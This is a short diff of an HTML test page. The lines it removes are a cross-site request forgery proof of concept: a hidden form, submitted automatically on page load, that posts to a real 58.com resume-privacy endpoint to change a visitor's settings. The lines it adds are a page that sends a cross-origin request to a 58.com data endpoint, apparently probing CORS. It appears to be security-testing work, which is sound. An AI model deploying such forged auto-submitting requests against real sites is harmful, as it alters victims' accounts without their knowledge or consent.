@@ -1,15 +1,30 @@
 
-
-
+<!DOCTYPE html>
 <html>
-  <head>
-    <title>Fake Form</title>
-  </head>
-  <body onload="document.bank_form.submit()">
-    <form action="https://jianli.58.com/resumeupdate/updateprivacy" method="POST" name="bank_form" style="display: none;">
-      <input type="text" name="showStatus" value="0" />
-      <input type="text" name="optionId" value="1" />
-    </form>
-  </body>
+<head>
+<meta charset="utf-8"> 
+<title>菜鸟教程(runoob.com)</title> 
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+
+</head>
+<body>
+
+
+
+    <script>
+        var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://repo.58.com/paramdata?valId=5015&valText=%E8%8B%B9%E6%9E%9C&cityId=1&cateId=36&_=1680429935302', true);
+xhr.onload = function() {
+  console.log('请求成功：', xhr.responseText);
+};
+xhr.onerror = function() {
+  console.error('请求失败');
+};
+xhr.send();
+    
+
+    </script>
+
+</body>
 </html>
 
